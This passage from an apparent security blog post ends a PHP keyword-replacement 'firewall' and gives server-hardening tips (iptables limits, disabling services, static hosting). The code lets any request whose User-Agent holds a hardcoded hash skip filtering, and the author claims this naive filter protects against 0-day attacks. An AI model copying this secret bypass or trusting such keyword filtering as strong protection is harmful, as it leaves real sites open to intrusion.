</span><span class='line'><span class="nv">$params</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</span><span class='line'><span class="nv">$agent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$list_deny</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$params</span><span class="p">,</span><span class="nv">$list_deny</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>      <span class="nv">$get</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      
</span><span class='line'>      <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$list_exceptions</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$script</span><span class="p">,</span><span class="nv">$list_exceptions</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>              <span class="nv">$get</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$get</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$agent</span><span class="p">,</span><span class="s1">&#39;b00c52cac042640c440db9684a59ae36&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>              <span class="nv">$_GET</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$list_deny</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span><span class="s2">&quot;***[firewall]***&quot;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">);</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span><span class='line'>  <span class="nv">$key</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$value</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$list_deny</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$list_deny</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>          <span class="nv">$post</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>          <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$list_exceptions</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$script</span><span class="p">,</span><span class="nv">$list_exceptions</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>                  <span class="nv">$post</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="nv">$post</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$agent</span><span class="p">,</span><span class="s1">&#39;b00c52cac042640c440db9684a59ae36&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="k">false</span><span class="p">){</span>
</span><span class='line'>              <span class="nv">$_POST</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$list_deny</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span><span class="s2">&quot;***[firewall]***&quot;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">);</span>
</span><span class='line'>              <span class="p">}</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>




<p>Note: If you want use this WAF on other CMS you must change white list and include it on cms config file.(config files usually included on all files in CMS that&rsquo;s why we do that)</p>




<p>And last thing about other services same cpanel,ssh and &hellip; , you must set IP limits with iptables for all of their ports number OR stop their services if you don&rsquo;t need these, if you want to stop services don&rsquo;t forgot for start them again you need CONSOLE ACCESS and if you don&rsquo;t have console access , don&rsquo;t disable them. disabling services protect you from 0Day Vulnerabilities that they are not public yet.</p>




<p>until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for ddos and deface or uploading.
We didn&rsquo;t config any IDS or IPS professional mode But be sure with doing these on your server be sure you protected so much</p>




<p>But at last if you are same me and very stressful , get a domain , install octopress blogging on your system and upload your site on <a href="http://pages.github.com/">github pages</a>, be safe more than any VPS. But It&rsquo;s not php and mysql hosting so it&rsquo;s limit but prefect for simple blogging.</p>




<p>Reference :
<br>1- Sites that i shared URLs
<br>2- Bash Code on <a href="http://google.com">Google</a>
<br>3- <a href="http://z3r0d4y.com">ZeroDay Cyber Research</a></p>




<p><a href="mailto:Ali[dot]Razmjoo1994[at]Gmail[at]Com">Ali Razmjoo</a></p>

]]></content>
  </entry>
  
</feed>
